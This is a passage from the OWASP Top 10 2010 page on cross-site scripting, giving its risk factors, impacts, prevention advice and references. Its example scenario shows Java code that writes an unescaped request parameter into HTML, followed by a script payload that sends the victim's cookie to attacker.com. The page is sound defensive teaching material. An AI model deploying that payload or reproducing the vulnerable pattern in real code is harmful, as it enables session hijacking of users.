`    <td ``>Consider anyone who can send untrusted data to the system, including external users, internal users, and administrators.`

</td>

`    <td ``>Attacker sends text-based attack scripts that exploit the interpreter in the browser. Almost any source of data can be an attack vector, including internal sources such as data from the database.`

</td>

`    <td colspan=2 ``>`[`XSS`](Cross-site_Scripting_\(XSS\) "wikilink")` is the most prevalent web application security flaw. XSS flaws occur when an application includes user supplied data in a page sent to the browser without properly validating or escaping that content. There are three known types of XSS flaws: 1) `[`Stored`](Cross-site_Scripting_\(XSS\)#Stored_XSS_Attacks "wikilink")`, 2) `[`Reflected`](Cross-site_Scripting_\(XSS\)#Reflected_XSS_Attacks "wikilink")`, and 3) `[`DOM``
 ``based``   ``XSS`](DOM_Based_XSS "wikilink")`.`

`Detection of most XSS flaws is fairly easy via testing or code analysis.`

</td>

\<td \>Attackers can execute scripts in a victim’s browser to hijack
user sessions, deface web sites, insert hostile content, redirect users,
hijack the user’s browser using malware, etc.

</td>

\<td \>Consider the business value of the affected system and all the
data it processes.

Also consider the business impact of public exposure of the
vulnerability.

</td>

You need to ensure that all user supplied input sent back to the browser
is verified to be safe (via input validation), and that user input is
properly escaped before it is included in the output page. Proper output
encoding ensures that such input is always treated as text in the
browser, rather than active content that might get executed.

Both static and dynamic tools can find some XSS problems automatically.
However, each application builds output pages differently and uses
different browser side interpreters such as JavaScript, ActiveX, Flash,
and Silverlight, which makes automated detection difficult. Therefore,
complete coverage requires a combination of manual code review and
manual penetration testing, in addition to any automated approaches in
use.

Web 2.0 technologies, such as AJAX, make XSS much more difficult to
detect via automated tools.  Preventing XSS requires keeping untrusted
data separate from active browser content.

1.  The preferred option is to properly escape all untrusted data based
    on the HTML context (body, attribute, JavaScript, CSS, or URL) that
    the data will be placed into. Developers need to include this
    escaping in their applications unless their UI framework does this
    for them. See the [OWASP XSS Prevention Cheat
    Sheet](XSS_\(Cross_Site_Scripting\)_Prevention_Cheat_Sheet "wikilink")
    for more information about data escaping techniques.
2.  Positive or “whitelist” input validation is also recommended as it
    helps protect against XSS, but is not a complete defense as many
    applications must accept special characters. Such validation should
    decode any encoded input, and then validate the length, characters,
    and format on that data before accepting the input.
3.  Consider employing Mozilla’s new [Content Security
    Policy](https://developer.mozilla.org/en/Introducing_Content_Security_Policy)
    that is coming out in Firefox 4 to defend against XSS.

The application uses untrusted data in the construction of the following
HTML snippet without validation or escaping:
<span style="color:red;">(String) page += "〈input name='creditcard'
type='TEXT‘ value='" + request.getParameter("CC") + "'〉";</span> The
attacker modifies the ‘CC’ parameter in their browser to:
<span style="color:red;">'〉〈script〉document.location=
'http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie〈/script〉'.</span>
This causes the victim’s session ID to be sent to the attacker’s
website, allowing the attacker to hijack the user’s current session.

Note that attackers can also use XSS to defeat any automated CSRF
defense the application might employ. See [A5 for info on
CSRF](Top_10_2010-A5 "wikilink").

  - [OWASP XSS Prevention Cheat
    Sheet](XSS_\(Cross_Site_Scripting\)_Prevention_Cheat_Sheet "wikilink")
  - [OWASP Cross-Site Scripting
    Article](Cross-site_Scripting_\(XSS\) "wikilink")
  - [ESAPI Encoder
    API](http://owasp-esapi-java.googlecode.com/svn/trunk_doc/latest/org/owasp/esapi/Encoder.html)
  - [ASVS: Output Encoding/Escaping Requirements
    (V6)](http://www.owasp.org/index.php/ASVS#tab=Downloads)
  - [ASVS: Input Validation Requirements
    (V5)](http://www.owasp.org/index.php/ASVS#tab=Downloads)
  - [Testing Guide: 1st 3 Chapters on Data Validation
    Testing](Testing_for_Data_Validation "wikilink")
  - [OWASP Code Review Guide: Chapter on XSS
    Review](Reviewing_Code_for_Cross-site_scripting "wikilink")

<!-- end list -->

  - [CWE Entry 79 on Cross-Site
    Scripting](http://cwe.mitre.org/data/definitions/79.html)
  - [RSnake's XSS Attack Cheat Sheet](http://ha.ckers.org/xss.html)
  - [Firefox 4’s Anti-XSS Content Security Policy
    Mechanism](https://developer.mozilla.org/en/Introducing_Content_Security_Policy)

[Category:OWASP Top Ten
Project](Category:OWASP_Top_Ten_Project "wikilink")